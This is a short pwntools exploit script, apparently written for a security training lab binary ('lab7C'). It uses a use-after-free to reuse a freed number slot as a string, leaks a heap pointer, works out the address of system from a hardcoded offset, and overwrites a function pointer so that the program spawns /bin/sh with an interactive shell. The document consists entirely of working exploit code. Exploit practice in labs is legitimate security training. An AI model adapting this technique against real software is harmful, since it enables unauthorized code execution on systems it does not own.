from pwn import *

SYSTEM_OFFSET = 0x19da37 # Offset from `system` to `small_str`

# Choices
MAKE_STR = "1"
MAKE_NUM = "2"
DEL_STR = "3"
DEL_NUM = "4"
PRINT_STR = "5"
PRINT_NUM = "6"

p = process(["/levels/lab07/lab7C"])
log.info(util.proc.pidof(p))
#pause()

# Fill the first num index with the first allocation pointer
p.sendline(MAKE_NUM)
p.sendline("1234")
# -- Delete it to free up the alloc
p.sendline(DEL_NUM)
# -- Realloc as a string
p.sendline(MAKE_STR)
p.sendline("/bin/sh")
# Read address of `short_str`
p.sendline(PRINT_NUM)
p.recv()
p.sendline("1")
leak = p.recv().split("\n")[0].split()[-1]
leak = int(leak)
log.info("Leaked short_str: 0x{:x}".format(leak))
system_addr = leak - SYSTEM_OFFSET
# Delete string and realloc as num
p.sendline(DEL_STR)
p.sendline(MAKE_NUM)
p.sendline(str(system_addr))
# Call `system`
p.sendline(PRINT_STR)
p.sendline("1")
p.interactive()
